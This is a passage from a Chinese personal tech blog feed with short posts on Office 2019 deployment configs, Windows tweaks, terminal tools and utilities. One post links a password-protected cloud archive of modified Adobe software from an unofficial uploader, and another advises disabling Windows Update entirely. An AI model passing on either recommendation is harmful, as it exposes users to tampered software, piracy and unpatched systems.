<li>情况一(推荐)：cmd 运行 <code>setup.exe /configure cdn_config.xml</code> ，会进行网络下载office，一般直接下载至 <code>&quot;C:\Program Files\Microsoft Office\Updates\Download\PackageFiles\*** &quot;</code>，下载完成之后，在移动到最终的目录。</li>
<li>情况二：cmd 运行 <code>setup.exe /configure cdn_config.xml</code> 安装本地的安装包。</li>
</ul>
</li>
<li>完成。</li>
</ol>
<p><img src="/images/随笔/OFFICE_CDN_下载路径.png" alt="在线下载的缓存路径"><br><img src="/images/随笔/OFFICE_CDN_下载完成的路径.png" alt="在线下载完成最终路径"></p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ul>
<li><p>(推荐)cdn_config_word_execl_ppt.xml : 网络安装，只保留三大组件和OneNote。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">ID</span>=<span class="string">"919e73d3-cf19-4b22-afa6-fba3c16d6afc"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Add</span> <span class="attr">OfficeClientEdition</span>=<span class="string">"64"</span> <span class="attr">Channel</span>=<span class="string">"PerpetualVL2019"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Product</span> <span class="attr">ID</span>=<span class="string">"ProPlus2019Volume"</span> <span class="attr">PIDKEY</span>=<span class="string">"NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Language</span> <span class="attr">ID</span>=<span class="string">"zh-cn"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Access"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Groove"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Lync"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"OneDrive"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Outlook"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Publisher"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"SharedComputerLicensing"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"SCLCacheOverride"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"AUTOACTIVATE"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"FORCEAPPSHUTDOWN"</span> <span class="attr">Value</span>=<span class="string">"FALSE"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"DeviceBasedLicensing"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Updates</span> <span class="attr">Enabled</span>=<span class="string">"TRUE"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">RemoveMSI</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">AppSettings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\excel\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">"51"</span> <span class="attr">Type</span>=<span class="string">"REG_DWORD"</span> <span class="attr">App</span>=<span class="string">"excel16"</span> <span class="attr">Id</span>=<span class="string">"L_SaveExcelfilesas"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\powerpoint\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">"27"</span> <span class="attr">Type</span>=<span class="string">"REG_DWORD"</span> <span class="attr">App</span>=<span class="string">"ppt16"</span> <span class="attr">Id</span>=<span class="string">"L_SavePowerPointfilesas"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\word\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">""</span> <span class="attr">Type</span>=<span class="string">"REG_SZ"</span> <span class="attr">App</span>=<span class="string">"word16"</span> <span class="attr">Id</span>=<span class="string">"L_SaveWordfilesas"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">AppSettings</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>cdn_config_all.xml : 网络安装，全部组件都安装，可以手动删减</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">ID</span>=<span class="string">"e53d0c83-a2ea-4ab4-8c94-754cbf3ca538"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Add</span> <span class="attr">OfficeClientEdition</span>=<span class="string">"64"</span> <span class="attr">Channel</span>=<span class="string">"PerpetualVL2019"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Product</span> <span class="attr">ID</span>=<span class="string">"ProPlus2019Volume"</span> <span class="attr">PIDKEY</span>=<span class="string">"NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Language</span> <span class="attr">ID</span>=<span class="string">"zh-cn"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Groove"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"SharedComputerLicensing"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"SCLCacheOverride"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"AUTOACTIVATE"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"FORCEAPPSHUTDOWN"</span> <span class="attr">Value</span>=<span class="string">"FALSE"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"DeviceBasedLicensing"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Updates</span> <span class="attr">Enabled</span>=<span class="string">"TRUE"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">RemoveMSI</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">AppSettings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\excel\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">"51"</span> <span class="attr">Type</span>=<span class="string">"REG_DWORD"</span> <span class="attr">App</span>=<span class="string">"excel16"</span> <span class="attr">Id</span>=<span class="string">"L_SaveExcelfilesas"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\powerpoint\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">"27"</span> <span class="attr">Type</span>=<span class="string">"REG_DWORD"</span> <span class="attr">App</span>=<span class="string">"ppt16"</span> <span class="attr">Id</span>=<span class="string">"L_SavePowerPointfilesas"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\word\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">""</span> <span class="attr">Type</span>=<span class="string">"REG_SZ"</span> <span class="attr">App</span>=<span class="string">"word16"</span> <span class="attr">Id</span>=<span class="string">"L_SaveWordfilesas"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">AppSettings</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>vol_local_conf.xml : vol本地安装，修改SourcePath为真实路径即可，比如我这里的“F:\”</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">ID</span>=<span class="string">"cf21b3d3-631b-4a5f-8e22-dba237fe668c"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Add</span> <span class="attr">OfficeClientEdition</span>=<span class="string">"64"</span> <span class="attr">Channel</span>=<span class="string">"PerpetualVL2019"</span> <span class="attr">SourcePath</span>=<span class="string">"F:\"</span> <span class="attr">AllowCdnFallback</span>=<span class="string">"TRUE"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Product</span> <span class="attr">ID</span>=<span class="string">"ProPlus2019Volume"</span> <span class="attr">PIDKEY</span>=<span class="string">"NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Language</span> <span class="attr">ID</span>=<span class="string">"zh-cn"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Access"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Groove"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Lync"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"OneDrive"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"OneNote"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Outlook"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExcludeApp</span> <span class="attr">ID</span>=<span class="string">"Publisher"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"SharedComputerLicensing"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"SCLCacheOverride"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"AUTOACTIVATE"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"FORCEAPPSHUTDOWN"</span> <span class="attr">Value</span>=<span class="string">"FALSE"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Name</span>=<span class="string">"DeviceBasedLicensing"</span> <span class="attr">Value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Updates</span> <span class="attr">Enabled</span>=<span class="string">"TRUE"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">RemoveMSI</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">AppSettings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\excel\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">"51"</span> <span class="attr">Type</span>=<span class="string">"REG_DWORD"</span> <span class="attr">App</span>=<span class="string">"excel16"</span> <span class="attr">Id</span>=<span class="string">"L_SaveExcelfilesas"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\powerpoint\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">"27"</span> <span class="attr">Type</span>=<span class="string">"REG_DWORD"</span> <span class="attr">App</span>=<span class="string">"ppt16"</span> <span class="attr">Id</span>=<span class="string">"L_SavePowerPointfilesas"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">Key</span>=<span class="string">"software\microsoft\office\16.0\word\options"</span> <span class="attr">Name</span>=<span class="string">"defaultformat"</span> <span class="attr">Value</span>=<span class="string">""</span> <span class="attr">Type</span>=<span class="string">"REG_SZ"</span> <span class="attr">App</span>=<span class="string">"word16"</span> <span class="attr">Id</span>=<span class="string">"L_SaveWordfilesas"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">AppSettings</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>Win10禁止自动更新</title>
    <url>/%E9%9A%8F%E7%AC%94/Win10%E7%A6%81%E6%AD%A2%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p>听说微软在10月05日开始推送Win11，而有些网友目前已经被推送Win11更新，更新之后都翻了车，不得不重装系统。吓得我赶紧禁止一下Win10上的自动更新。一直以来我是不管Win10，让自己更新、重启，所以系统补丁一直保持最新，但是这次升级Win11跨版本的还是要慎重一点。</p>
<ol>
<li>快捷键 <code>Win + R</code> ，输入 <code>services.msc</code></li>
<li>找到 <code>windows update</code></li>
<li>双击，改为 <code>禁用</code></li>
</ol>
<p><img src="/images/win/禁用自动更新1.png" alt></p>
<p><img src="/images/win/禁用自动更新2.png" alt></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>Win10降级Win7知识</title>
    <url>/%E9%9A%8F%E7%AC%94/Win10%E9%99%8D%E7%BA%A7Win7%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>Win8、Win10对技术更新了不少，现在的购买的机器都是预装Win10，如果想要降级为Win7，那么如果想简单的重装系统，会发现装不了。</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ol>
<li>新的机器都是采用 <code>UEFI BIOS</code> 启动方式 ，它具有启动速度快、安全性高和支持大容量硬盘的特点。</li>
<li>Win10的硬盘分区采用 <code>GUID</code> 格式</li>
</ol>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>如果要降级重装 <code>Win7</code>，修改这两个东西：</p>
<ol>
<li>设置 <code>BIOS</code> 为 <code>Legacy</code> 启动方式，这种是老机器用的方式。</li>
<li>将硬盘分区转换为MBR格式（利用PE分区工具）</li>
</ol>
<h4 id="BIOS具体操作"><a href="#BIOS具体操作" class="headerlink" title="BIOS具体操作"></a>BIOS具体操作</h4><ol>
<li>进入 <code>BIOS</code> 中的 <code>Boot</code> 项</li>
<li><code>Secure Boot</code> 关闭掉（disable）</li>
<li><code>Boot List Option</code> 选择 <code>Legacy</code></li>
</ol>
<h4 id="硬盘分区操作"><a href="#硬盘分区操作" class="headerlink" title="硬盘分区操作"></a>硬盘分区操作</h4><ol>
<li>利用PE的分区工具</li>
<li>找到 <code>转换分区表类型为MBR格式</code> 的功能</li>
</ol>
<p>这样应该就能装Win7了。</p>
<p><strong> 没试验过，仅供参考！ </strong><br><strong> 没试验过，仅供参考！ </strong><br><strong> 没试验过，仅供参考！ </strong></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>Windows Terminal美化</title>
    <url>/%E9%9A%8F%E7%AC%94/Windows%20Terminal%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h2 id="1-在应用商店安装Windows-Terminal"><a href="#1-在应用商店安装Windows-Terminal" class="headerlink" title="1. 在应用商店安装Windows Terminal"></a>1. 在应用商店安装Windows Terminal</h2><p>安装完成之后，启动Windows Terminal,在Windows Terminal内完成一些软件安装。</p>
<h2 id="2-允许powershell执行脚本"><a href="#2-允许powershell执行脚本" class="headerlink" title="2. 允许powershell执行脚本"></a>2. 允许powershell执行脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ Set-ExecutionPolicy RemoteSigned -Scope CurrentUser</span><br></pre></td></tr></table></figure>
<h2 id="3-安装posh-git和oh-my-posh"><a href="#3-安装posh-git和oh-my-posh" class="headerlink" title="3. 安装posh-git和oh-my-posh"></a>3. 安装posh-git和oh-my-posh</h2><p><code>oh-my-posh</code> 可以让powershell的样式和 linux下的<code>oh-my-zsh</code>一样。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ Install-Module posh-git -Scope CurrentUser</span><br><span class="line">$ Install-Module oh-my-posh -Scope CurrentUser</span><br></pre></td></tr></table></figure></p>
<h2 id="4-启用默认设置"><a href="#4-启用默认设置" class="headerlink" title="4. 启用默认设置"></a>4. 启用默认设置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ Set-Prompt</span><br><span class="line">$ Import-Module oh-my-posh</span><br></pre></td></tr></table></figure>
<h2 id="5-执行命令使用notepad打开PROFILE"><a href="#5-执行命令使用notepad打开PROFILE" class="headerlink" title="5. 执行命令使用notepad打开PROFILE"></a>5. 执行命令使用notepad打开PROFILE</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ if (!(Test-Path -Path $PROFILE )) &#123; New-Item -Type File -Path $PROFILE -Force &#125; notepad $PROFILE</span><br></pre></td></tr></table></figure>
<p>输入：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module posh-git</span><br><span class="line">Import-Module oh-my-posh</span><br><span class="line">Set-Theme Paradox</span><br></pre></td></tr></table></figure></p>
<h2 id="6-安装字体"><a href="#6-安装字体" class="headerlink" title="6. 安装字体"></a>6. 安装字体</h2><p><a href="https://github.com/adam7/delugia-code/releases/download/v1910.04.1/Delugia.Nerd.Font.Complete.ttf" target="_blank" rel="noopener">Delugia.Nerd.Font.Complete.ttf</a></p>
<h2 id="7-配色"><a href="#7-配色" class="headerlink" title="7. 配色"></a>7. 配色</h2><p>打开setting,这是一个json配置文件</p>
<p>“profiles” - “colorScheme” 字段是配置颜色主题name，主题在”schemes”: []中定义,如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"synthwave-everything"</span>,</span><br><span class="line">  <span class="attr">"black"</span>: <span class="string">"#fefefe"</span>,</span><br><span class="line">  <span class="attr">"red"</span>: <span class="string">"#f97e72"</span>,</span><br><span class="line">  <span class="attr">"green"</span>: <span class="string">"#72f1b8"</span>,</span><br><span class="line">  <span class="attr">"yellow"</span>: <span class="string">"#fede5d"</span>,</span><br><span class="line">  <span class="attr">"blue"</span>: <span class="string">"#6d77b3"</span>,</span><br><span class="line">  <span class="attr">"purple"</span>: <span class="string">"#c792ea"</span>,</span><br><span class="line">  <span class="attr">"cyan"</span>: <span class="string">"#f772e0"</span>,</span><br><span class="line">  <span class="attr">"white"</span>: <span class="string">"#fefefe"</span>,</span><br><span class="line">  <span class="attr">"brightBlack"</span>: <span class="string">"#fefefe"</span>,</span><br><span class="line">  <span class="attr">"brightRed"</span>: <span class="string">"#f88414"</span>,</span><br><span class="line">  <span class="attr">"brightGreen"</span>: <span class="string">"#72f1b8"</span>,</span><br><span class="line">  <span class="attr">"brightYellow"</span>: <span class="string">"#fff951"</span>,</span><br><span class="line">  <span class="attr">"brightBlue"</span>: <span class="string">"#36f9f6"</span>,</span><br><span class="line">  <span class="attr">"brightPurple"</span>: <span class="string">"#e1acff"</span>,</span><br><span class="line">  <span class="attr">"brightCyan"</span>: <span class="string">"#f92aad"</span>,</span><br><span class="line">  <span class="attr">"brightWhite"</span>: <span class="string">"#fefefe"</span>,</span><br><span class="line">  <span class="attr">"background"</span>: <span class="string">"#2a2139"</span>,</span><br><span class="line">  <span class="attr">"foreground"</span>: <span class="string">"#f0eff1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/随笔/windwos_termial.png" alt></p>
<p>更多主题：<a href="https://github.com/mbadolato/iTerm2-Color-Schemes" target="_blank" rel="noopener">iTerm2-Color-Schemes</a></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>VPOSY</title>
    <url>/%E9%9A%8F%E7%AC%94/vposy/</url>
    <content><![CDATA[<p>微博@vposy 改装的软件更新很快，想用最新版本软件可以试试，下载地址:<br><a href="https://pan.baidu.com/s/1r3DezqdsUhnfaJb0ob2Iww#9yi4" target="_blank" rel="noopener">https://pan.baidu.com/s/1r3DezqdsUhnfaJb0ob2Iww#9yi4</a> 提取码9yi4，压缩包如果有密码，解压密码为： <code>@vposy</code></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>adobe</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows十六进制编辑器</title>
    <url>/%E9%9A%8F%E7%AC%94/Windows%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91%E5%99%A8/</url>
    <content><![CDATA[<p>在<a href="https://tool.pediy.com/" target="_blank" rel="noopener">【这里】</a> 发现很多好用的软件</p>
<h3 id="010-Editor"><a href="#010-Editor" class="headerlink" title="010 Editor"></a>010 Editor</h3><p>一款全新概念的十六进制编辑器，能解析和编辑一切可视的二进制文件方面功能强大，有别于传统的十六进制编辑器，特别对一些二进制文件进行分析时，简直是神器。。其最强大的功能在于支持模板和脚本操作，只要你为一种类型的二进制文件定义了模板，在以后编辑同一类型的文件的时候就能够调用原来的模板来进行自动分析文件。</p>
<h3 id="Hex-Workshop"><a href="#Hex-Workshop" class="headerlink" title="Hex Workshop"></a>Hex Workshop</h3><p>一款非常专业的十六进制编辑器，功能强大的开发工具， 可以方便地进行十六进制编辑、插入、填充、删除、剪切、复制和粘贴操作， 配合查找、替换、比较以及计算校验和等命令使工作更加快捷。速度快，算法 精确，并附带计算器和转换器工具。</p>
<h3 id="Winhex"><a href="#Winhex" class="headerlink" title="Winhex"></a>Winhex</h3><p>winhex 是一个专门用来对付各种日常紧急情况的工具。它可以用来检查和修复各种文件、恢复删除文件、硬盘损坏造成的数据丢失等。同时它还可以让你看到其他程序隐藏起来的文件和数据。总体来说是一款非常不错的 16 进制编辑器。得到 ZDNetSoftwareLibrary 五星级最高评价，拥有强大的系统效用。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>搜索过滤掉某网站</title>
    <url>/%E9%9A%8F%E7%AC%94/%E6%90%9C%E7%B4%A2%E8%BF%87%E6%BB%A4%E6%8E%89%E6%9F%90%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<p>自己搜索的内容含有 csdn.net 的，但这个网站要登录才能看，所以这些搜索结果是无用的，所以要过滤掉这些无用的结果。<br>如某搜索，这样搜索：<code>关键字 -site:csdn.net</code> 就是过滤掉 csdn.net 的搜索结果。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>免费的终端神器MobaXterm</title>
    <url>/%E9%9A%8F%E7%AC%94/%E5%85%8D%E8%B4%B9%E7%9A%84%E7%BB%88%E7%AB%AF%E7%A5%9E%E5%99%A8MobaXterm/</url>
    <content><![CDATA[<p>官网：<a href="https://mobaxterm.mobatek.net/" target="_blank" rel="noopener">https://mobaxterm.mobatek.net/</a></p>
<p>有收费的，但开源免费版足够使用：<br><a href="https://download.mobatek.net/2052020102712115/MobaXterm_Portable_v20.5.zip" target="_blank" rel="noopener">https://download.mobatek.net/2052020102712115/MobaXterm_Portable_v20.5.zip</a></p>
<p>支持SSH，FTP，串口，VNC，X server和标签。</p>
<ul>
<li>优点：<br>占用内存小，开一个标签时就30MB左右，支持同时输入多台机器。内置的远程目录非常方便，可以随时上传/下载文件。</li>
<li>缺点：<br>进后台一段时间会触发屏保（企鹅），鼠标点击一下可以关闭屏保（收费版可以永久关闭），但关闭之后使用会有一点点卡的感觉，可能就是台省着用内存的原因（Tabby一上来就用了250MB内存）。</li>
</ul>
<p><img src="/images/随笔/MobaXterm1.png" alt><br><img src="/images/随笔/MobaXterm2.png" alt></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>开源的终端神器Tabby</title>
    <url>/%E9%9A%8F%E7%AC%94/%E5%85%8D%E8%B4%B9%E7%9A%84%E7%BB%88%E7%AB%AF%E7%A5%9E%E5%99%A8Tabby/</url>
    <content><![CDATA[<p>官网：<a href="https://tabby.sh/" target="_blank" rel="noopener">https://tabby.sh/</a><br>开源地址：<a href="https://github.com/Eugeny/tabby" target="_blank" rel="noopener">https://github.com/Eugeny/tabby</a><br>下载地址：<a href="https://github.com/Eugeny/tabby/releases/tag/v1.0.169" target="_blank" rel="noopener">https://github.com/Eugeny/tabby/releases/tag/v1.0.169</a></p>
<p><code>Tabby</code>（原名 <code>Terminus</code>）是一个简洁风格的终端，支持 <code>SSH</code> 、串口、<code>Raw Socket</code> 和 <code>Telent</code>，使用 <code>TypeScript</code> + <code>Electron</code> 开发。</p>
<p>缺点：Electron开发的东西通病-&gt; 安装包大（解压大概338MB），占用内存高（一个标签大概要250MB内存）<br>优点：界面流畅、简洁</p>
<p><img src="/images/随笔/tabby_1.png" alt><br><img src="/images/随笔/tabby_1_a.png" alt><br><img src="/images/随笔/tabby_2.png" alt></p>
<p>新建一个SSH会话<br><img src="/images/随笔/tabby_3.png" alt><br><img src="/images/随笔/tabby_4.png" alt><br><img src="/images/随笔/tabby_5.png" alt></p>
<p>快捷入口&amp;连接历史<br><img src="/images/随笔/tabby_6.png" alt></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>生成Banner的网站</title>
    <url>/%E9%9A%8F%E7%AC%94/%E7%94%9F%E6%88%90Banner%E7%9A%84%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<p><a href="http://www.network-science.de/ascii/" target="_blank" rel="noopener"> 英文文字 ascii 生成 </a></p>
<p><a href="http://www.degraeve.com/img2txt.php" target="_blank" rel="noopener"> 图片生成 ascii </a></p>
<p>更多网站搜索“ascii art generator”</p>
<p><a href="http://www.jianshu.com/p/1f0b295874eb" target="_blank" rel="noopener">ASCII Art：使用纯文本流程图</a></p>
<p><a href="https://github.com/stathissideris/ditaa" target="_blank" rel="noopener">ditaa</a></p>
<p><a href="https://github.com/dozingcat/AsciiCam" target="_blank" rel="noopener">AsciiCam</a></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>网络安全测试工具Goby</title>
    <url>/%E9%9A%8F%E7%AC%94/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7Goby/</url>
    <content><![CDATA[<p><a href="https://gobies.org/" target="_blank" rel="noopener">Goby</a>是一款网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造。<br>新一代网络安全技术，通过为目标建立完整的资产数据库，实现快速的安全应急，帮企业梳理资产暴露攻击面。</p>
<p><a href="https://cn.gobies.org/faq.html" target="_blank" rel="noopener">【常见问题里面很多软件相关的知识】</a></p>
<p><img src="/images/随笔/goby1.png" alt><br><img src="/images/随笔/goby2.png" alt></p>
<p><code>Golang</code> + <code>Electron</code> 前后端分离的模式开发，所以支持跨平台。</p>
<p><img src="/images/随笔/goby3.png" alt></p>
<p><a href="https://zhuanlan.zhihu.com/p/123355449" target="_blank" rel="noopener">【为什么我会选择golang做Goby的开发语言】</a></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>记一次U盘安装原版Windows7系统</title>
